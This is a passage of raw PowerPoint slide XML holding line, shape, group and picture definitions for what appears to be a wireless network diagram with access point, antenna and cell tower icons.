            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="1260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19" name="Line 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7850160" y="5540040"/>
              <a:ext cx="85680" cy="3240"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="1260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0" name="Line 10"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8020800" y="5232960"/>
              <a:ext cx="114120" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="1260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1" name="Line 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="5975280" y="4781520"/>
              <a:ext cx="253800" cy="46980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2" name="Line 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6000480" y="4832280"/>
              <a:ext cx="19692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3" name="Line 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5741640" y="5168880"/>
              <a:ext cx="27324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4" name="Line 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6113160" y="5248080"/>
              <a:ext cx="49068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5" name="Line 15"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="6352920" y="5155920"/>
              <a:ext cx="54000" cy="8568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6" name="Line 16"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6165720" y="5244840"/>
              <a:ext cx="1440" cy="8280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7" name="Line 17"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="6564240" y="5252760"/>
              <a:ext cx="0" cy="7632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8" name="Line 18"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6643440" y="5111640"/>
              <a:ext cx="503280" cy="26964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29" name="Line 19"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6092640" y="5046480"/>
              <a:ext cx="8100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0" name="Line 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5946480" y="3638520"/>
              <a:ext cx="235080" cy="7452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1" name="Line 21"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="5790960" y="3792240"/>
              <a:ext cx="168480" cy="324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32" name="Group 22"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5511960" y="3559320"/>
              <a:ext cx="506160" cy="351720"/>
              <a:chOff x="5511960" y="3559320"/>
              <a:chExt cx="506160" cy="351720"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="233" name="Picture 915" descr="access_point_stylized_small"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5540760" y="3604680"/>
                <a:ext cx="369720" cy="3063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234" name="Picture 916" descr="antenna_radiation_stylized"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId3"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5511960" y="3559320"/>
                <a:ext cx="506160" cy="105480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235" name="CustomShape 23"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6915240" y="3586320"/>
              <a:ext cx="1314000" cy="674280"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b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6" name="CustomShape 24"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6912000" y="2060640"/>
              <a:ext cx="1730160" cy="1125000"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b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0">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="800080"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="FFFFFF"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="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7" name="Line 25"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7296120" y="3871800"/>
              <a:ext cx="163440" cy="12060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8" name="Line 26"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7392960" y="3792240"/>
              <a:ext cx="27936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39" name="Line 27"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="7629480" y="3877920"/>
              <a:ext cx="134640" cy="10476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0" name="Line 28"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6622920" y="2646360"/>
              <a:ext cx="509400" cy="2880"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom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1" name="Line 29"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7257960" y="4755960"/>
              <a:ext cx="390600" cy="18432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2" name="Line 30"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="6637320" y="4743360"/>
              <a:ext cx="322200" cy="19836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3" name="Line 31"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6680160" y="5037120"/>
              <a:ext cx="97128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4" name="Line 32"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="7476840" y="2550960"/>
              <a:ext cx="123840" cy="8712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5" name="Line 33"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7305480" y="2724120"/>
              <a:ext cx="0" cy="82440"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom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6" name="Line 34"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="7476840" y="2620800"/>
              <a:ext cx="263520" cy="28908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7" name="Line 35"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7842240" y="2619360"/>
              <a:ext cx="0" cy="19656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8" name="Line 36"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7495920" y="2925720"/>
              <a:ext cx="18900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49" name="Line 37"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8049960" y="2916000"/>
              <a:ext cx="17784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0" name="Line 38"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="7196040" y="2992320"/>
              <a:ext cx="98280" cy="704880"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9360">
              <a:solidFill>
                <a:srgbClr val="96969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1" name="Line 39"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="7788240" y="2992320"/>
              <a:ext cx="110880" cy="72684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2" name="Line 40"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="7172280" y="4133520"/>
              <a:ext cx="226800" cy="43668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3" name="Line 41"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8245440" y="2914560"/>
              <a:ext cx="177480" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9360">
              <a:solidFill>
                <a:schemeClr val="bg2"/>
              </a:solidFill>
              <a:prstDash val="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54" name="Group 42"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5952960" y="1901880"/>
              <a:ext cx="468000" cy="620640"/>
              <a:chOff x="5952960" y="1901880"/>
              <a:chExt cx="468000" cy="620640"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="255" name="Line 43"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="6037920" y="2081520"/>
                <a:ext cx="141480" cy="39924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6" name="Line 44"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6179400" y="2081520"/>
                <a:ext cx="141840" cy="39708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7" name="Line 45"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6037920" y="2478600"/>
                <a:ext cx="141480" cy="4392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8" name="Line 46"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="6179400" y="2478600"/>
                <a:ext cx="141840" cy="4392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9" name="Line 47"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6179400" y="2090520"/>
                <a:ext cx="0" cy="43200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0" name="Line 48"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipV="1">
                <a:off x="6037920" y="2437920"/>
                <a:ext cx="141480" cy="4284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1" name="Line 49"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1" flipV="1">
                <a:off x="6179400" y="2437920"/>
                <a:ext cx="141840" cy="4068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2" name="Line 50"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6098400" y="2306880"/>
                <a:ext cx="81000" cy="3276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3" name="Line 51"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipV="1">
                <a:off x="6179400" y="2306880"/>
                <a:ext cx="86040" cy="3276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4" name="Line 52"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6071040" y="2365560"/>
                <a:ext cx="104760" cy="4428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5" name="Line 53"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipV="1">
                <a:off x="6179400" y="2374560"/>
                <a:ext cx="105480" cy="3888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6" name="Line 54"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipV="1">
                <a:off x="6179400" y="2247120"/>
                <a:ext cx="54360" cy="1620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7" name="Line 55"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipV="1">
                <a:off x="6179400" y="2164680"/>
                <a:ext cx="34200" cy="1224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8" name="Line 56"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6118560" y="2241720"/>
                <a:ext cx="65520" cy="2160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9" name="Line 57"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6148080" y="2161080"/>
                <a:ext cx="37440" cy="21240"/>
              </a:xfrm>
              <a:prstGeom prst="line">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="1908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0" name="CustomShape 58"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6154920" y="2044800"/>
                <a:ext cx="47160" cy="46080"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="808080"/>
              </a:solidFill>
              <a:ln w="9360">
                <a:solidFill>
                  <a:srgbClr val="80808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pic>
            <p:nvPicPr>
              <p:cNvPr id="271" name="Picture 953" descr="cell_tower_radiation_gray"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId4"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5952960" y="1901880"/>
                <a:ext cx="468000" cy="34236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72" name="Group 59"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="6189480" y="2462040"/>
              <a:ext cx="453600" cy="253800"/>
              <a:chOff x="6189480" y="2462040"/>
              <a:chExt cx="453600" cy="253800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="273" name="Line 60"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6189480" y="2462040"/>
                <a:ext cx="152280" cy="95400"/>
              </a:xfrm>
              <a:prstGeom prst="line">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="9360">
                <a:solidFill>
                  <a:srgbClr val="969696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4" name="CustomShape 61"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6254640" y="2620800"/>
                <a:ext cx="387000" cy="9504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5" name="CustomShape 62"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6254640" y="2611440"/>
                <a:ext cx="388440" cy="583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6" name="CustomShape 63"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6253200" y="2546280"/>
                <a:ext cx="387000" cy="11088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277" name="Group 64"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="6330960" y="2575080"/>
                <a:ext cx="218880" cy="52200"/>
                <a:chOff x="6330960" y="2575080"/>
                <a:chExt cx="218880" cy="52200"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="278" name="CustomShape 65"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6330960" y="2575080"/>
                  <a:ext cx="21888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9" name="CustomShape 66"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6340680" y="2575080"/>
                  <a:ext cx="19908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280" name="Line 67"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6254640" y="2598480"/>
                <a:ext cx="0" cy="7452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1" name="Line 68"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6640200" y="2601720"/>
                <a:ext cx="0" cy="730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82" name="Group 69"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="7102440" y="2549520"/>
              <a:ext cx="390240" cy="174240"/>
              <a:chOff x="7102440" y="2549520"/>
              <a:chExt cx="390240" cy="174240"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="283" name="CustomShape 70"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7104240" y="2626200"/>
                <a:ext cx="387000" cy="975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4" name="CustomShape 71"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7104240" y="2616480"/>
                <a:ext cx="388440" cy="601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5" name="CustomShape 72"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7102440" y="2549520"/>
                <a:ext cx="387000" cy="1137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286" name="Group 73"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7180200" y="2579040"/>
                <a:ext cx="218880" cy="53640"/>
                <a:chOff x="7180200" y="2579040"/>
                <a:chExt cx="218880" cy="53640"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="287" name="CustomShape 74"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7180200" y="2579040"/>
                  <a:ext cx="2188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88" name="CustomShape 75"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7190280" y="2579040"/>
                  <a:ext cx="1990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289" name="Line 76"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7103880" y="2603160"/>
                <a:ext cx="0" cy="766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0" name="Line 77"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7489800" y="2606400"/>
                <a:ext cx="0" cy="7524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91" name="Group 78"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="7113600" y="2813040"/>
              <a:ext cx="389880" cy="174240"/>
              <a:chOff x="7113600" y="2813040"/>
              <a:chExt cx="389880" cy="174240"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="292" name="CustomShape 79"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7115040" y="2889720"/>
                <a:ext cx="387000" cy="975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3" name="CustomShape 80"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7115040" y="2880000"/>
                <a:ext cx="388440" cy="601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4" name="CustomShape 81"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7113600" y="2813040"/>
                <a:ext cx="387000" cy="1137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295" name="Group 82"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7191360" y="2842560"/>
                <a:ext cx="218880" cy="53640"/>
                <a:chOff x="7191360" y="2842560"/>
                <a:chExt cx="218880" cy="53640"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="296" name="CustomShape 83"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7191360" y="2842560"/>
                  <a:ext cx="2188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7" name="CustomShape 84"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7201440" y="2842560"/>
                  <a:ext cx="1990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298" name="Line 85"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7115040" y="2866680"/>
                <a:ext cx="0" cy="766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9" name="Line 86"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7500600" y="2869920"/>
                <a:ext cx="0" cy="7524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00" name="Group 87"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="7662960" y="2814480"/>
              <a:ext cx="389880" cy="174600"/>
              <a:chOff x="7662960" y="2814480"/>
              <a:chExt cx="389880" cy="174600"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="301" name="CustomShape 88"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7664400" y="2891520"/>
                <a:ext cx="387000" cy="975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2" name="CustomShape 89"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7664400" y="2881440"/>
                <a:ext cx="388440" cy="601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3" name="CustomShape 90"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7662960" y="2814480"/>
                <a:ext cx="387000" cy="1137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04" name="Group 91"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7740720" y="2844000"/>
                <a:ext cx="218880" cy="53640"/>
                <a:chOff x="7740720" y="2844000"/>
                <a:chExt cx="218880" cy="53640"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="305" name="CustomShape 92"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7740720" y="2844000"/>
                  <a:ext cx="2188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06" name="CustomShape 93"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7750440" y="2844000"/>
                  <a:ext cx="1990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07" name="Line 94"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7664400" y="2868480"/>
                <a:ext cx="0" cy="766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8" name="Line 95"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8049960" y="2871720"/>
                <a:ext cx="0" cy="748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09" name="Group 96"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="7589880" y="2449440"/>
              <a:ext cx="389880" cy="174240"/>
              <a:chOff x="7589880" y="2449440"/>
              <a:chExt cx="389880" cy="174240"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="310" name="CustomShape 97"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7591320" y="2526120"/>
                <a:ext cx="387000" cy="975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1" name="CustomShape 98"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7591320" y="2516400"/>
                <a:ext cx="388440" cy="601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2" name="CustomShape 99"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7589880" y="2449440"/>
                <a:ext cx="387000" cy="1137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13" name="Group 100"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7667640" y="2478960"/>
                <a:ext cx="218880" cy="53640"/>
                <a:chOff x="7667640" y="2478960"/>
                <a:chExt cx="218880" cy="53640"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="314" name="CustomShape 101"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7667640" y="2478960"/>
                  <a:ext cx="2188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5" name="CustomShape 102"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7677360" y="2478960"/>
                  <a:ext cx="199080" cy="5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16" name="Line 103"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7591320" y="2503080"/>
                <a:ext cx="0" cy="766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7" name="Line 104"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7976880" y="2506320"/>
                <a:ext cx="0" cy="7524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18" name="Group 105"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="7637400" y="3700440"/>
              <a:ext cx="491760" cy="205920"/>
              <a:chOff x="7637400" y="3700440"/>
              <a:chExt cx="491760" cy="205920"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="319" name="CustomShape 106"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7639560" y="3791160"/>
                <a:ext cx="487800" cy="1152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0" name="CustomShape 107"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7639560" y="3779640"/>
                <a:ext cx="489600" cy="709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1" name="CustomShape 108"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7637400" y="3700440"/>
                <a:ext cx="487800" cy="13464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22" name="Group 109"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7735320" y="3735360"/>
                <a:ext cx="275760" cy="63360"/>
                <a:chOff x="7735320" y="3735360"/>
                <a:chExt cx="275760" cy="63360"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="323" name="CustomShape 110"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7735320" y="3735360"/>
                  <a:ext cx="27576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4" name="CustomShape 111"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7747920" y="3735360"/>
                  <a:ext cx="25092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25" name="Line 112"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7639200" y="3763800"/>
                <a:ext cx="0" cy="9072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6" name="Line 113"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8125560" y="3767760"/>
                <a:ext cx="0" cy="8496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327" name="Line 114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6327720" y="3798720"/>
              <a:ext cx="679320" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="936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328" name="Group 115"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="6986520" y="3687840"/>
              <a:ext cx="491760" cy="205920"/>
              <a:chOff x="6986520" y="3687840"/>
              <a:chExt cx="491760" cy="205920"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="329" name="CustomShape 116"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6988680" y="3778560"/>
                <a:ext cx="487800" cy="1152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0" name="CustomShape 117"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6988680" y="3766680"/>
                <a:ext cx="489600" cy="709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1" name="CustomShape 118"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6986520" y="3687840"/>
